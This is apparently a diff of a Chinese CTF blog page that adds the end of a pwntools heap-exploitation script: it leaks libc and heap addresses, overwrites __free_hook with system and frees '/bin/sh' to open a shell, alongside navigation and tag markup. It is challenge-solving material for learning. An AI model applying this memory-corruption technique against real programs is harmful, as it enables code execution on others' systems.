+add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>
+
+out<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
+
+use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
+
+add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>
+add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>
+
+delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
+
+out<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+delete_db<span class="token punctuation">(</span><span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
+
+add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token number">0x90</span><span class="token punctuation">)</span>
+
+use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
+edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x98</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    add<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    delete<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>
+
+delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
+
+out<span class="token punctuation">(</span><span class="token punctuation">)</span>
+show_db<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1ecbe0</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>
+free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
+system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+
+use<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    add<span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>
+
+delete<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span>
+
+out<span class="token punctuation">(</span><span class="token punctuation">)</span>
+show_db<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token string">b'\n'</span> <span class="token operator">+</span> <span class="token string">b'\t'</span><span class="token punctuation">)</span>
+heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+edit_db<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook <span class="token operator">-</span> <span class="token number">0x88</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span><span class="token punctuation">)</span>
+
+add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x90</span><span class="token punctuation">)</span>
+add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+add_db<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
+delete_db<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>
+
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 
                 
             </div>
@@ -726,6 +1134,14 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
+                            
+                                <a href="/tags/heap/">
+                                    <span class="chip bg-color">heap</span>
+                                </a>
+                            
+                                <a href="/tags/oob/">
+                                    <span class="chip bg-color">oob</span>
+                                </a>
                             
                                 <a href="/tags/envp/">
                                     <span class="chip bg-color">envp</span>
@@ -780,74 +1196,25 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2023/08/06/2023-syctf-harde-pwn/2023-syctf-harde-pwn/">
+                <a href="/2023/08/10/2023-syctf-pwn-fu-xian/2023syctf-computer-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="2023_syctf_harde_pwn复现">
+                        <img src="/medias/featureimages/28.jpg" class="responsive-img" alt="2023-syctf-pwn复现">
                         
-                        <span class="card-title">2023_syctf_harde_pwn复现</span>
+                        <span class="card-title">2023-syctf-pwn复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            2023 syctf harde pwn复现
+                            2023 syctf pwn部分题复现
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-08-06
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-08-10
                         </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/pwn/" class="post-category">
-                                    pwn
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
-                        <span class="chip bg-color">非栈上的格式化字符串</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/08/01/ciscn-minidb-fu-xian/ciscn-minidb-fu-xian/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/25.jpg" class="responsive-img" alt="2023_ciscn_minidb复现">
-                        
-                        <span class="card-title">2023_ciscn_minidb复现</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            2023ciscn区域半决赛minidb复现
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2023-08-01
-                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -867,8 +1234,57 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                         <span class="chip bg-color">heap</span>
                     </a>
                     
-                    <a href="/tags/oob/">
-                        <span class="chip bg-color">oob</span>
+                    <a href="/tags/%E9%9D%9E%E6%A0%88%E4%B8%8A%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">
+                        <span class="chip bg-color">非栈上的格式化字符串</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2023/07/20/buuctf-shua-ti-chi-xu-geng-xin/buuctf-shua-ti-chi-xu-geng-xin/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/33.jpg" class="responsive-img" alt="buuctf刷题（持续更新）">
+                        
+                        <span class="card-title">buuctf刷题（持续更新）</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            buuctf刷题记录
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-07-20
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/pwn/" class="post-category">
+                                    pwn
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
                     </a>
                     
                 </div>
@@ -1054,7 +1470,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">45.3k</span>&nbsp;字
+                class="white-color">48.8k</span>&nbsp;字
             
             
             
